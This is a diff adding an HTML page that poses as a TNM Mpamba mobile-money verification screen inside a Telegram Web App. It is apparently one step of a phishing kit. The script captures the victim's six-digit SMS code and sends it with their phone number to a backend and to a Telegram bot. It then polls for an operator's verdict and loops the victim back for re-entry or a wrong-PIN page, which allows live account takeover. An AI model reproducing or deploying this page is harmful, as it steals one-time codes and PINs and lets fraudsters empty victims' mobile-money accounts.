@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification Code - TNM Mpamba Malawi</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --tnm-green: #38b000;
+            --tnm-green-dark: #2d9100;
+            --tnm-dark: #1e293b;
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --input-bg: #f1f5f9;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Top Header Area matching UI Design */
+        .app-header {
+            width: 100%;
+            background-color: transparent;
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--text-dark);
+            letter-spacing: -0.3px;
+        }
+
+        /* Main Container */
+        .container {
+            width: 100%;
+            max-width: 440px;
+            margin: 10px auto 0;
+            padding: 0 24px 30px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin: 10px 0 25px;
+            line-height: 1.45;
+            font-weight: 500;
+        }
+
+        /* 🚨 Red Status Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* 6 OTP Input Box Group */
+        .otp-input-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+
+        .otp-box {
+            flex: 1;
+            height: 52px;
+            background-color: var(--input-bg);
+            border: 1.5px solid transparent;
+            border-radius: 12px;
+            font-size: 22px;
+            font-weight: 800;
+            text-align: center;
+            outline: none;
+            color: var(--text-dark);
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: var(--tnm-green);
+            background-color: #ffffff;
+        }
+
+        .otp-box.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        /* Timer Banner Box */
+        .timer-card {
+            background-color: #f1f5f9;
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
+        .timer-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .timer-info .label {
+            font-size: 14px;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+
+        .timer-info .sub-label {
+            font-size: 13px;
+            color: var(--text-dark);
+            font-weight: 500;
+        }
+
+        .timer-countdown {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--tnm-green);
+        }
+
+        .resend-btn-text {
+            color: var(--tnm-green);
+            font-weight: 800;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Buttons Section */
+        .btn-confirm {
+            background-color: var(--tnm-green);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 12px rgba(56, 176, 0, 0.3);
+        }
+
+        .btn-confirm:active {
+            background-color: var(--tnm-green-dark);
+            transform: scale(0.99);
+        }
+
+        .btn-cancel {
+            background-color: transparent;
+            color: var(--tnm-green);
+            border: none;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+            text-decoration: underline;
+        }
+
+        /* 📱 Full Screen Overlay Status Page */
+        .overlay-status {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: var(--tnm-dark);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .overlay-status.active {
+            display: flex;
+        }
+
+        .overlay-spinner-circle {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(180deg, #4ed310 0%, #38b000 100%);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(56, 176, 0, 0.35);
+        }
+
+        .overlay-spinner-circle::after {
+            content: '';
+            width: 66px;
+            height: 66px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid var(--tnm-dark);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 0 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .overlay-subtext {
+            color: #94a3b8;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+            max-width: 300px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">←</a>
+    <div class="header-title">Waiting for Verification Code</div>
+</div>
+
+<div class="container">
+    <p class="instruction-text" id="instructionMessage">
+        TNM Mpamba will automatically read the verification code sent to your phone number <b id="phoneDisplay">+265 -- --- --</b>. Make sure your SIM is in this device for verification to complete.
+    </p>
+
+    <!-- Red Error Banner for Wrong Code -->
+    <div id="statusErrorContainer" class="error-banner"></div>
+
+    <form id="otpForm" onsubmit="submitOtp(event)">
+        <!-- 6 Box PIN Group -->
+        <div class="otp-input-group">
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+        </div>
+
+        <!-- Timer Box -->
+        <div class="timer-card">
+            <div class="timer-info">
+                <span class="label">Did not receive OTP?</span>
+                <span class="sub-label">Retry in</span>
+            </div>
+            <div id="timerCountdown" class="timer-countdown">02:00</div>
+            <div id="resendBtn" class="resend-btn-text" onclick="resendCode()">Resend Code</div>
+        </div>
+
+        <button type="submit" id="verifyBtn" class="btn-confirm">Confirm</button>
+        <button type="button" class="btn-cancel" onclick="goBack()">Cancel</button>
+    </form>
+</div>
+
+<div id="statusOverlay" class="overlay-status">
+    <div class="overlay-spinner-circle"></div>
+    <h2 class="overlay-title" id="overlayMainText">Please wait...</h2>
+    <p class="overlay-subtext" id="overlaySubText">Verifying SMS code...</p>
+</div>
+
+<script>
+    const TOTAL_TIME = 120; // 2 Minutes
+    let timeLeft = TOTAL_TIME;
+    let timerInterval = null;
+    let statusPollingInterval = null;
+
+    const timerCountdownEl = document.getElementById('timerCountdown');
+    const resendBtnEl = document.getElementById('resendBtn');
+    const phoneDisplayEl = document.getElementById('phoneDisplay');
+    const statusErrorContainer = document.getElementById('statusErrorContainer');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+
+    // Overlay Elements
+    const statusOverlay = document.getElementById('statusOverlay');
+    const overlayMainText = document.getElementById('overlayMainText');
+    const overlaySubText = document.getElementById('overlaySubText');
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const rawPhone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "881234567";
+        phoneDisplayEl.textContent = rawPhone.startsWith('+') ? rawPhone : `+265 ${rawPhone}`;
+
+        setupOtpBoxes();
+        startTimer();
+    };
+
+    function setupOtpBoxes() {
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                box.value = box.value.replace(/\D/g, '');
+
+                // Clear error styling
+                otpBoxes.forEach(b => b.classList.remove('input-error'));
+                statusErrorContainer.style.display = 'none';
+
+                if (box.value && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && !box.value && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        if (otpBoxes.length > 0) otpBoxes[0].focus();
+    }
+
+    function startTimer() {
+        clearInterval(timerInterval);
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendBtnEl.style.display = 'none';
+        timerCountdownEl.style.display = 'block';
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+    }
+
+    function onTimerExpired() {
+        timerCountdownEl.style.display = 'none';
+        resendBtnEl.style.display = 'block';
+    }
+
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Resend error:", err);
+        }
+        alert("A new verification code has been sent via SMS.");
+        startTimer();
+    }
+
+    async function submitOtp(event) {
+        event.preventDefault();
+
+        let codeVal = "";
+        otpBoxes.forEach(b => codeVal += b.value);
+
+        if (codeVal.length < 6) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Incorrect code, please enter the full 6-digit code.";
+            otpBoxes.forEach(b => b.classList.add('input-error'));
+            return;
+        }
+
+        // Hide errors
+        statusErrorContainer.style.display = 'none';
+        otpBoxes.forEach(b => b.classList.remove('input-error'));
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // Display overlay waiting screen
+        overlayMainText.textContent = "Please wait...";
+        overlaySubText.textContent = "Verifying SMS code...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Notification send error:", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Wait for bot response via status polling
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Code Confirmed!";
+                    overlaySubText.textContent = "Redirecting...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Incorrect code. Please enter the correct code.";
+                    otpBoxes.forEach(b => {
+                        b.classList.add('input-error');
+                        b.value = "";
+                    });
+                    if (otpBoxes.length > 0) otpBoxes[0].focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Status polling error:", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
